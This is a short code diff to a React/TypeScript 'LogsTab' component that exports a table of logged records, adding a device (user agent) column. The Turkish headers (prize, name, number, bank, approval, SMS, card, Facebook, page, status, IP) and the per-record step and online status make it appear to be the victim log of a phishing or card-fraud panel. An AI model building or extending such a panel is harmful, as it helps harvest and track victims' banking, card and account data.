@@ -1395,7 +1395,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       };
 
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1452,6 +1452,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           stepTextFor(String(r.current_step ?? ""), fd),
           { text: s(r.status).toUpperCase() || "-", color: r.status === "online" ? "#059669" : "#6b7280" },
           s(r.ip_address) || "-",
+          { text: s(r.user_agent) || "-", fontSize: 5.5, color: "#6b7280" },
         ]);
       }
 
